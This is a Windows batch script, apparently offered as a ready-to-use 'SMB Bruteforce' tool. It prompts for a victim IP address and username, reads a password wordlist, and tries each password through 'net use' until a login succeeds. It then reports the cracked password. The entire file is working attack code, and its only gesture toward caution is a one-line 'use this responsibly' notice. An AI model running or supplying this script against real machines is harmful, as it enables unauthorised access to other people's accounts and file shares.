@echo off
:: Set the console color to cyan text on a blue background
color 0B
title SMB Bruteforce

:: Display a welcome message with better formatting and color
echo.
echo [INFO] This is a brute force tool for connecting to IPs.
echo [INFO] Please use this responsibly.
echo [INFO] You will need to know the IP and the username you want to attack.
echo.

:: Prompt the user for the target IP and username
set /p ip="[+] Enter Victim IP Address: "
set /p user="[+] Enter Victim Username: "
echo.

:: Check if BBFD.txt exists in the current directory
if exist "BBFD.txt" (
    set "wordlist=BBFD.txt"
) else (
    :: If BBFD.txt does not exist, use PowerShell to open a file dialog for selecting the password list file
    echo [INFO] Select the password list file:
    for /f "delims=" %%I in ('powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $f = new-object System.Windows.Forms.OpenFileDialog; $f.InitialDirectory = [Environment]::GetFolderPath('Desktop'); $f.Filter = 'Text Files (*.txt)|*.txt'; $f.ShowDialog() | Out-Null; $f.FileName"') do set "wordlist=%%I"
)

:: Check if the wordlist file exists
if not exist "%wordlist%" (
    echo [ERROR] File not found. Please select a valid file.
    pause
    exit
)

:: Start brute-forcing the password
echo [INFO] Starting brute force attack using the wordlist: %wordlist%
echo.

:: Iterate through each password in the wordlist and attempt the connection
set /a count=1
for /f "delims=" %%a in (%wordlist%) do (
    call :attempt "%%a"
)

:: If no password was found, notify the user
echo [ERROR] Password not found in the wordlist.
pause
exit

:success
:: Password found, notify the user
echo.
echo [SUCCESS] Password Found: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
:: Try connecting using the current password
set "pass=%~1"
echo [INFO] Attempting password: %pass%
net use \\%ip% /user:%user% %pass% >nul 2>&1

:: Check if the connection was successful
if %errorlevel% EQU 0 goto success
